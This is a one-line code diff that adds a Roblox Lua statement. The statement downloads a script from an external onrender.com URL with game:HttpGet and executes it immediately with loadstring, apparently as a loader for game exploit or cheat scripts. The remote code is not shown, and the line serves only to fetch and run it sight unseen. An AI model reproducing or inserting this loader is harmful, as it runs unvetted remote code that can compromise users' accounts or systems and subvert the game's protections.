@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://incorbxlua.onrender.com/raw/ba098035-2561-4c67-8654-43221b5ad9f3", true))()
